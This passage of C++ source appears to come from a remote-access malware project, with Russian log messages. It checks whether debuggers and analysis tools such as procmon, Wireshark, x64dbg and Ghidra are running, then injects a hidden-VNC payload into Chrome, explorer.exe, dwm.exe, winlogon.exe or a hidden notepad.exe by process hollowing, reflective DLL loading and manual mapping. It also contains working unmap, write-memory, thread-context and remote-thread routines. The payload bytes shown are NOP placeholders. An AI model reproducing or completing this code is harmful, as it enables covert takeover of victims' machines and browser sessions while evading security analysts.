    std::transform(imagePath.begin(), imagePath.end(), imagePath.begin(), ::tolower);
    
    std::vector<std::string> suspiciousNames = {
        "procmon", "wireshark", "fiddler", "ollydbg", "x64dbg",
        "ida", "ghidra", "immunity", "windbg", "cheatengine"
    };
    
    for (const auto& name : suspiciousNames) {
        if (imagePath.find(name) != std::string::npos) {
            return true;
        }
    }
    
    return false;
}

bool IsProcessDebugged(DWORD processId) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, processId);
    if (!hProcess) {
        return true;
    }
    
    BOOL isDebugged = FALSE;
    CheckRemoteDebuggerPresent(hProcess, &isDebugged);
    
    CloseHandle(hProcess);
    return isDebugged != FALSE;
}

bool IsProcessMonitored(DWORD processId) {
    std::string imagePath = GetProcessImagePath(processId);
    if (imagePath.empty()) {
        return true;
    }
    
    std::transform(imagePath.begin(), imagePath.end(), imagePath.begin(), ::tolower);
    
    std::vector<std::string> monitoringTools = {
        "processhacker", "systemexplorer", "sysinternals",
        "autoruns", "regshot", "api monitor"
    };
    
    for (const auto& tool : monitoringTools) {
        if (imagePath.find(tool) != std::string::npos) {
            return true;
        }
    }
    
    return false;
}

}

namespace HVNCInjection {

InjectionResult InjectHVNCIntoBrowser(const std::string& browserPath) {
    CodeInjector injector;
    
    std::string browserName = browserPath.empty() ? "chrome.exe" : browserPath;
    std::vector<DWORD> browserProcesses = injector.FindProcessesByName(browserName);
    
    if (browserProcesses.empty()) {
        InjectionResult result;
        result.errorMessage = "Не найдены процессы браузера " + browserName;
        return result;
    }
    
    // Выбор наиболее подходящего процесса
    DWORD targetPID = 0;
    for (DWORD pid : browserProcesses) {
        if (injector.IsProcessSuitable(pid)) {
            targetPID = pid;
            break;
        }
    }
    
    if (targetPID == 0) {
        InjectionResult result;
        result.errorMessage = "Не найден подходящий процесс браузера";
        return result;
    }
    
    // Загрузка HVNC payload (заглушка)
    std::vector<uint8_t> hvncPayload = {0x90, 0x90, 0x90, 0x90}; // NOP заглушка
    
    LogInfo("Инъекция HVNC в браузер");
    return injector.InjectIntoProcess(hvncPayload, InjectionType::REFLECTIVE_DLL, browserName);
}

InjectionResult InjectHVNCIntoSystemProcess() {
    CodeInjector injector;
    
    std::vector<std::string> targetProcesses = {"explorer.exe", "dwm.exe", "winlogon.exe"};
    
    for (const auto& processName : targetProcesses) {
        std::vector<DWORD> processes = injector.FindProcessesByName(processName);
        
        for (DWORD pid : processes) {
            if (injector.IsProcessSuitable(pid)) {
                std::vector<uint8_t> hvncPayload = {0x90, 0x90, 0x90, 0x90}; // NOP заглушка
                
                LogInfo("Инъекция HVNC в системный процесс");
                return injector.InjectIntoProcess(hvncPayload, InjectionType::PROCESS_HOLLOWING, processName);
            }
        }
    }
    
    InjectionResult result;
    result.errorMessage = "Не найдены подходящие системные процессы";
    return result;
}

InjectionResult InjectHVNCIntoExistingProcess(DWORD targetPID) {
    CodeInjector injector;
    
    if (!injector.IsProcessSuitable(targetPID)) {
        InjectionResult result;
        result.errorMessage = "Процесс не подходит для инъекции";
        return result;
    }
    
    std::vector<uint8_t> hvncPayload = {0x90, 0x90, 0x90, 0x90}; // NOP заглушка
    
    LogInfo("Инъекция HVNC в указанный процесс");
    return injector.InjectIntoProcess(hvncPayload, InjectionType::MANUAL_MAP);
}

InjectionResult CreateHiddenHVNCProcess() {
    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi = {0};
    
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    std::string commandLine = "C:\\Windows\\System32\\notepad.exe";
    
    if (CreateProcessA(NULL, const_cast<char*>(commandLine.c_str()),
                      NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        
        CodeInjector injector;
        std::vector<uint8_t> hvncPayload = {0x90, 0x90, 0x90, 0x90}; // NOP заглушка
        
        InjectionResult result = injector.InjectIntoProcess(hvncPayload, InjectionType::PROCESS_HOLLOWING, "notepad.exe");
        
        if (result.success) {
            ResumeThread(pi.hThread);
            LogInfo("Создан скрытый HVNC процесс");
        } else {
            TerminateProcess(pi.hProcess, 0);
            LogError("Ошибка создания скрытого HVNC процесса");
        }
        
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        
        return result;
    }
    
    InjectionResult result;
    result.errorMessage = "Ошибка создания процесса-хоста";
    return result;
}

}

// Missing private method implementations for CodeInjector
bool CodeInjector::InjectDLLAndExecute(HANDLE targetProcess, const std::vector<uint8_t>& dllData) {
    // Simplified implementation
    return false;
}

bool CodeInjector::CreateSuspendedProcess(const std::string& targetPath, PROCESS_INFORMATION& pi) {
    STARTUPINFOA si = {sizeof(si)};
    return CreateProcessA(targetPath.c_str(), NULL, NULL, NULL, FALSE,
                         CREATE_SUSPENDED, NULL, NULL, &si, &pi) != 0;
}

bool CodeInjector::UnmapTargetImage(HANDLE targetProcess, LPVOID baseAddress) {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    pNtUnmapViewOfSection NtUnmapViewOfSection = 
        (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
    
    if (NtUnmapViewOfSection) {
        return NtUnmapViewOfSection(targetProcess, baseAddress) == STATUS_SUCCESS;
    }
    return false;
}

bool CodeInjector::MapPayloadToTarget(HANDLE targetProcess, const std::vector<uint8_t>& payload, 
                                     LPVOID targetBase, PEInfo& peInfo) {
    // Simplified implementation
    SIZE_T written;
    return WriteProcessMemory(targetProcess, targetBase, payload.data(), payload.size(), &written) != 0;
}

bool CodeInjector::PatchEntryPoint(HANDLE targetProcess, HANDLE targetThread, 
                                  LPVOID baseAddress, DWORD entryPoint) {
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_INTEGER;
    if (!GetThreadContext(targetThread, &ctx)) {
        return false;
    }
    
#ifdef _WIN64
    ctx.Rcx = (DWORD64)baseAddress + entryPoint;
#else
    ctx.Eax = (DWORD)baseAddress + entryPoint;
#endif
    
    return SetThreadContext(targetThread, &ctx) != 0;
}

bool CodeInjector::AllocateImageMemory(HANDLE targetProcess, const PEInfo& peInfo, LPVOID& baseAddress) {
    baseAddress = VirtualAllocEx(targetProcess, NULL, peInfo.imageSize,
                                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    return baseAddress != NULL;
}

bool CodeInjector::CopySections(HANDLE targetProcess, LPVOID baseAddress, const PEInfo& peInfo) {
    SIZE_T written;
    
    // Copy headers
    if (!WriteProcessMemory(targetProcess, baseAddress, peInfo.rawData.data(),
                           peInfo.ntHeaders->OptionalHeader.SizeOfHeaders, &written)) {
        return false;
    }
    
    // Copy sections
    for (auto section : peInfo.sections) {
        if (section->SizeOfRawData > 0) {
            LPVOID sectionDest = (LPVOID)((DWORD_PTR)baseAddress + section->VirtualAddress);
            const uint8_t* sectionSrc = peInfo.rawData.data() + section->PointerToRawData;
            
            if (!WriteProcessMemory(targetProcess, sectionDest, sectionSrc,
                                   section->SizeOfRawData, &written)) {
                return false;
            }
        }
    }
    
    return true;
}

bool CodeInjector::ExecuteInTarget(HANDLE targetProcess, LPVOID entryPoint) {
    HANDLE hThread = CreateRemoteThread(targetProcess, NULL, 0,
                                       (LPTHREAD_START_ROUTINE)entryPoint,
                                       NULL, 0, NULL);
    if (hThread) {
        CloseHandle(hThread);
        return true;
    }
    return false;
}